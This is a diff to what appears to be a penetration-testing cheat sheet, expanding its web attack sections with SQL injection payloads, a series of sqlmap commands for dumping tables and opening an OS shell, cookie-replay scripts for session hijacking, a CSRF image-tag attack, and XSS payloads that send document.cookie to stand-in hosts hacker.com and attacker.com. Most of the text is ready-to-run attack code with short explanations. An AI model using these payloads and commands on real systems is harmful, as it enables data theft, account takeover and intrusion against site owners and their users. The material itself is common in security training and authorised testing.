@@ -909,102 +909,253 @@ Binders -> Merge two programs
 
 #### SQL Injection
 
+- `sql` (SQL Injection context): refers to Structured Query Language statements and payloads used to interact with databases. In a security-testing context, these examples demonstrate how improperly handled input can be abused to manipulate queries, bypass authentication, or extract unauthorized data.
+
 ```sql
--- Normal database fetching query
-SELECT u_name, u_age, u_email FROM users WHERE u_id='$Id';
+-- Typical database query fetching user information
+SELECT u_name, u_age, u_email
+FROM users
+WHERE u_id = '$Id';
 
--- Normal database login query
-SELECT * FROM users WHERE u_email='$Email' AND u_password='$Password';
+-- Typical database login query (vulnerable if inputs are not sanitized)
+SELECT *
+FROM users
+WHERE u_email = '$Email'
+  AND u_password = '$Password';
 ```
 
 ```
-# Union payload to obtain unauthorized information
+# UNION-based payloads (data extraction)
 
-$Id=1' UNION SELECT u_name, u_password, u_address FROM users; -- 
+# Extract additional columns from the same table
+$Id=1' UNION SELECT u_name, u_password, u_address FROM users -- 
 
-{example_condition}' UNION SELECT {same number of custom rows} FROM {custom table}; -- 
+# Generic UNION structure (column count must match original query)
+{value}' UNION SELECT col1, col2, col3 FROM target_table -- 
+```
 
-# Login payload to obtain unauthorized session
+```
+# Authentication bypass payloads (login manipulation)
 
+# Bypass login to impersonate admin
 $Email=admin@email.com'; -- 
 
-{desired account}'; -- 
+# Generic authentication bypass
+{target_user}'; -- 
 ```
 
 ```
-# Boolean payload for confirmation results
-$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 -- 
+# Boolean-based payload (confirming injection via true/false behavior)
+$Id=1' AND ASCII(SUBSTRING(username,1,1)) = 97 -- 
 
-# Time delay payload for confirmation results
-$Id=10' AND IF(version() like ‘5%’, sleep(10),
-‘false’) -- 
+# Time-based payload (confirming injection via response delay)
+$Id=10' AND IF(version() LIKE '5%', SLEEP(10), 0) -- 
 
-# Error based payload for error display results
-$Id=10' OR UTL_INADDR.GET_HOST_NAME( (SELECT
-user FROM DUAL) ) -- 
+# Error-based payload (forcing database error output)
+$Id=10' OR UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL)) -- 
 
-# Out of band payload for error display results
-$Id=10' OR UTL_HTTP.request(‘testerserver.com:80' || (SELECT user FROM DUAL)) -- 
+# Out-of-band (OOB) payload (external interaction)
+$Id=10' OR UTL_HTTP.request('http://testerserver.com:80/' || (SELECT user FROM DUAL)) -- 
 ```
 
-SQLMap
+- `sqlmap`: is an automated SQL injection detection and exploitation tool that identifies vulnerable parameters and can extract database information, dump data, read/write files, and execute OS commands depending on the database and configuration. It is widely used in penetration testing and security research.
+
+```bash
+# Basic SQL injection test against a URL with a vulnerable parameter
+sqlmap -u "http://example.com/item.php?id=1"
+
+# Specify a GET parameter explicitly
+sqlmap -u "http://example.com/item.php?id=1" -p id
+
+# Test a POST request (login form)
+sqlmap -u "http://example.com/login.php" \
+--data="username=admin&password=admin" \
+-p username,password
+
+# Use a saved HTTP request from Burp or a proxy
+sqlmap -r request.txt
+
+# Enumerate available databases
+sqlmap -u "http://example.com/item.php?id=1" --dbs
+
+# List tables from a specific database
+sqlmap -u "http://example.com/item.php?id=1" -D shop_db --tables
+
+# List columns from a specific table
+sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users --columns
+
+# Dump data from a specific table
+sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users --dump
+
+# Dump only specific columns
+sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users -C username,password --dump
+
+# Automatically detect and exploit injection with higher intensity
+sqlmap -u "http://example.com/item.php?id=1" --level=5 --risk=3
+
+# Use a specific injection technique (Boolean-based)
+sqlmap -u "http://example.com/item.php?id=1" --technique=B
+
+# Bypass simple WAFs using tamper scripts
+sqlmap -u "http://example.com/item.php?id=1" --tamper=space2comment
+
+# Attempt OS command execution (if supported)
+sqlmap -u "http://example.com/item.php?id=1" --os-shell
+
+# Identify the backend DBMS only
+sqlmap -u "http://example.com/item.php?id=1" --banner
+```
 
 #### Session Hijacking
+
+- `custom_script.py`: is a custom Python script that uses the requests library to send HTTP requests with manually defined cookies. It is commonly used to automate session replay, test session hijacking scenarios, and validate authentication or authorization behavior programmatically.
 
 ```python
 import requests
 
-url = "https://example.com"
+# Target URL that requires an authenticated session
+url = "https://example.com/dashboard"
 
-# Define your custom cookies as a dictionary
+# Custom cookies (e.g., stolen, reused, or manually crafted session values)
 cookies = {
     "sessionid": "123456",
     "user": "alice"
 }
 
-response = requests.get(url, cookies=cookies)
+# Optional custom headers
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "Accept": "text/html"
+}
+
+# Send GET request with cookies and headers
+response = requests.get(url, cookies=cookies, headers=headers, timeout=10)
+
+# Basic response handling
+print("Status code:", response.status_code)
+print("Response length:", len(response.text))
+```
+
+- `curl`: is a command-line tool for transferring data over network protocols (HTTP, HTTPS, FTP, etc.). In security testing, it is often used to manually craft requests, replay sessions, test authentication, and validate session handling.
+
+```bash
+# Send a request using a stolen or reused session cookie (session hijacking test)
+curl -b "sessionid=123456; user=alice" https://example.com/dashboard
+
+# Load cookies from a Netscape-format cookie file
+curl -b cookies.txt https://example.com/profile
+
+# Save cookies returned by the server for later reuse
+curl -c cookies.txt https://example.com/login
+
+# Send a request with custom headers (common during auth testing)
+curl -H "User-Agent: Mozilla/5.0" \
+     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" \
+     https://api.example.com/v1/users
+
+# Replay a POST request using an existing session cookie
+curl -b "PHPSESSID=abcd1234" \
+     -X POST \
+     -d "email=alice@example.com&role=admin" \
+     https://example.com/update-profile
 ```
 
 ```bash
-curl -b "sessionid=123456; user=alice" https://example.com
+# Netscape HTTP Cookie File
 
-curl -b cookies.txt https://example.com
+.example.com    TRUE    /       FALSE   1735689600  sessionid   123456
+.example.com    TRUE    /       FALSE   1735689600  user        alice
+
+# Template explanation
+Domain -> .example.com
+Include subdomains -> TRUE or FALSE
+Path -> /
+Secure flag -> TRUE (HTTPS only) or FALSE
+Expiration (Unix timestamp) -> 1735689600
+Cookie name -> sessionid
+Cookie value -> 123456
 ```
 
-#### Cross Site Request Forgery
+#### Cross-Site Request Forgery
 
-Consits of prompting a user to visit a website they may be logged into and executing a command they are not aware of, for example:
+Cross‑Site Request Forgery is a web vulnerability that tricks an authenticated user into unknowingly performing an action on a website they trust. Because the browser automatically includes session cookies, the target application may treat the forged request as legitimate if proper protections are not in place.
 
-```
+If a user is already authenticated to a site and that site does not verify the origin or intent of requests, an attacker can cause unintended actions to be executed on the user’s behalf.
+
+```bash
+# Example of a vulnerable request
 http://bank.com/transfer?amount=6000&to=hacker
 ```
 
-If user is logged in `bank.com` and clicks this link, if no proper verification is done, he will transfer money to the attacker.
+If the user is logged into `bank.com` and visits this URL, the browser automatically sends the session cookie.
+Without CSRF protection, the server may process the transfer as if the user intentionally requested it.
 
-The main problem is getting the user to click this link, which could be performed, for example:
+The core challenge in CSRF is causing the victim’s browser to make the request. This can be done without user awareness by embedding the request into normal-looking content.
 
 ```html
-<!-- User visits malicious website -->
+<!-- Victim visits a malicious website -->
 
-<!-- User loads the following HTML -->
-<img src=http://bank.com/transfer?amount=6000&to=hacker>
+<!-- Browser automatically loads this HTML -->
+<img src="http://bank.com/transfer?amount=6000&to=hacker">
 
-<!-- User visits website unwillingly and performs transaction -->
+<!-- The request is sent with the victim's authenticated session -->
 ```
 
 #### Cross Site Scripting
 
-Executing malicious java scripts by users without their intention. Stored and reflected. Exploit on form inputs that get printed on webpages.
+Cross‑Site Scripting is a web vulnerability that allows attackers to inject and execute malicious JavaScript in a victim’s browser without their knowledge. It typically occurs when user‑supplied input is not properly validated or escaped before being rendered in a webpage.
 
+There are two main Cross-Site Scripting types:
+
+- **Reflected XSS**: Payload is reflected immediately in the response
+
+- **Stored XSS**: Payload is stored (e.g., database) and executed for every visitor
+
+---
+
+- `custom_script.js`: is an example of a malicious JavaScript payload commonly used in Cross‑Site Scripting (XSS) attacks. Its purpose is to demonstrate how injected JavaScript can execute in a victim’s browser and access sensitive data such as session cookies when proper protections are missing.
 
 ```js
 // Script example to steal session cookies
 <script>
-window.open("http://hacker.com/steal?c=" + document.cookie)
+  window.open(
+    "http://hacker.com/steal?c=" + document.cookie
+  );
 </script>
 ```
 
-XSSer
+- `xsser`: is an automated Cross‑Site Scripting (XSS) detection and exploitation framework used to identify reflected, stored, and DOM‑based XSS vulnerabilities. It supports multiple injection techniques, payload encodings, and evasion methods, and is commonly used in web application security testing.
+
+```bash
+# Basic XSS scan against a URL
+xsser -u "http://example.com/search.php?q=test"
+
+# Scan a specific parameter only
+xsser -u "http://example.com/search.php?q=test" -p q
+
+# Test POST parameters (e.g., login or form submission)
+xsser -u "http://example.com/comment.php" \
+-d "username=alice&comment=test"
+
+# Use a predefined XSS payload
+xsser -u "http://example.com/search.php?q=test" --payload "<script>alert(1)</script>"
+
+# Automatic payload generation and fuzzing
+xsser -u "http://example.com/search.php?q=test" --auto
+
+# Crawl the website and test discovered URLs
+xsser -u "http://example.com" --crawl
+
+# Bypass basic filters using payload obfuscation
+xsser -u "http://example.com/search.php?q=test" --encoding hex
+
+# Launch an attack using an external listener (cookie stealing demo)
+xsser -u "http://example.com/search.php?q=test" \
+--payload "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
+
+# Generate a report of discovered vulnerabilities
+xsser -u "http://example.com/search.php?q=test" --report xsser_report.txt
+```
 
 ### Privilege Escalation
 
